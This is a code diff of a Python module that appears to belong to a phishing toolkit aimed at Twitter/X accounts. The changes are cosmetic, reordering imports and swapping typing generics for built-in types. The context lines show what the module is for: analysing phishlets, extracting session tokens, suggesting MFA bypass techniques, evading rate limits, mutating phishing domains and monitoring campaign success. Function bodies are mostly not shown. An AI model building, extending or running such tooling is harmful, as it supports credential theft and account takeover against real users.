@@ -10,17 +10,17 @@ Advanced optimization specifically for Twitter/X phishing:
 - Twitter-specific behavioral patterns
 """
 
-import json
-import time
-import random
 import hashlib
-from typing import Dict, List, Any, Optional
+import json
+import random
+import time
 from dataclasses import dataclass
 from datetime import datetime, timedelta
+from typing import Any, Dict, List, Optional
 
+from ..behavioral.analyzer import BehavioralAnalyzer
 from ..mutation.mutator import PhishletMutator
 from ..reverse_engineer.analyzer import PhishletAnalyzer
-from ..behavioral.analyzer import BehavioralAnalyzer
 
 
 @dataclass
@@ -28,8 +28,8 @@ class TwitterEndpoint:
     """Twitter API endpoint information"""
     endpoint: str
     method: str
-    parameters: List[str]
-    headers: Dict[str, str]
+    parameters: list[str]
+    headers: dict[str, str]
     last_seen: datetime
     success_rate: float
     detection_risk: str
@@ -39,11 +39,11 @@ class TwitterEndpoint:
 class TwitterAuthFlow:
     """Twitter authentication flow analysis"""
     flow_id: str
-    steps: List[str]
-    mfa_methods: List[str]
-    token_extraction_points: List[str]
+    steps: list[str]
+    mfa_methods: list[str]
+    token_extraction_points: list[str]
     session_duration: timedelta
-    bypass_techniques: List[str]
+    bypass_techniques: list[str]
 
 
 class TwitterOptimizer:
@@ -91,7 +91,7 @@ class TwitterOptimizer:
             ]
         }
     
-    def analyze_twitter_phishlet(self, phishlet_path: str) -> Dict[str, Any]:
+    def analyze_twitter_phishlet(self, phishlet_path: str) -> dict[str, Any]:
         """Analyze Twitter-specific phishlet"""
         # Basic analysis
         basic_analysis = self.analyzer.analyze_phishlet(phishlet_path)
@@ -114,7 +114,7 @@ class TwitterOptimizer:
             'twitter_analysis': twitter_analysis
         }
     
-    def _analyze_mfa_handling(self, analysis) -> Dict[str, Any]:
+    def _analyze_mfa_handling(self, analysis) -> dict[str, Any]:
         """Analyze MFA handling capabilities"""
         mfa_analysis = {
             'supports_mfa': False,
@@ -145,7 +145,7 @@ class TwitterOptimizer:
         
         return mfa_analysis
     
-    def _analyze_api_compatibility(self, analysis) -> Dict[str, Any]:
+    def _analyze_api_compatibility(self, analysis) -> dict[str, Any]:
         """Analyze Twitter API compatibility"""
         api_analysis = {
             'compatible_endpoints': [],
@@ -178,7 +178,7 @@ class TwitterOptimizer:
         
         return api_analysis
     
-    def _analyze_session_management(self, analysis) -> Dict[str, Any]:
+    def _analyze_session_management(self, analysis) -> dict[str, Any]:
         """Analyze session management capabilities"""
         session_analysis = {
             'session_extraction': False,
@@ -210,7 +210,7 @@ class TwitterOptimizer:
         
         return session_analysis
     
-    def _analyze_rate_limit_evasion(self, analysis) -> Dict[str, Any]:
+    def _analyze_rate_limit_evasion(self, analysis) -> dict[str, Any]:
         """Analyze rate limiting evasion capabilities"""
         evasion_analysis = {
             'has_evasion': False,
@@ -237,7 +237,7 @@ class TwitterOptimizer:
         
         return evasion_analysis
     
-    def _detect_twitter_protections(self, analysis) -> List[str]:
+    def _detect_twitter_protections(self, analysis) -> list[str]:
         """Detect Twitter-specific protection mechanisms"""
         detected_protections = []
         
@@ -259,7 +259,7 @@ class TwitterOptimizer:
         
         return detected_protections
     
-    def _generate_twitter_recommendations(self, analysis) -> List[Dict[str, Any]]:
+    def _generate_twitter_recommendations(self, analysis) -> list[dict[str, Any]]:
         """Generate Twitter-specific optimization recommendations"""
         recommendations = []
         
@@ -309,7 +309,7 @@ class TwitterOptimizer:
         
         return recommendations
     
-    def _create_twitter_mutation_strategy(self, analysis) -> Dict[str, Any]:
+    def _create_twitter_mutation_strategy(self, analysis) -> dict[str, Any]:
         """Create Twitter-specific mutation strategy"""
         strategy = {
             'domain_variation': {
@@ -345,7 +345,7 @@ class TwitterOptimizer:
         
         return strategy
     
-    def _detect_mfa_methods(self, indicators: List[str], js_patterns: List[str]) -> List[str]:
+    def _detect_mfa_methods(self, indicators: list[str], js_patterns: list[str]) -> list[str]:
         """Detect supported MFA methods"""
         methods = []
         
@@ -363,7 +363,7 @@ class TwitterOptimizer:
         
         return methods
     
-    def _suggest_mfa_bypasses(self, mfa_methods: List[str]) -> List[str]:
+    def _suggest_mfa_bypasses(self, mfa_methods: list[str]) -> list[str]:
         """Suggest MFA bypass techniques"""
         bypasses = []
         
@@ -381,7 +381,7 @@ class TwitterOptimizer:
         
         return bypasses
     
-    def generate_twitter_variants(self, base_phishlet: str, num_variants: int = 5) -> List[Dict[str, Any]]:
+    def generate_twitter_variants(self, base_phishlet: str, num_variants: int = 5) -> list[dict[str, Any]]:
         """Generate Twitter-optimized variants"""
         variants = []
         
@@ -432,7 +432,7 @@ class TwitterOptimizer:
         
         return variants
     
-    def monitor_twitter_effectiveness(self, campaign_data: Dict[str, Any]) -> Dict[str, Any]:
+    def monitor_twitter_effectiveness(self, campaign_data: dict[str, Any]) -> dict[str, Any]:
         """Monitor Twitter campaign effectiveness"""
         monitoring = {
             'success_metrics': {
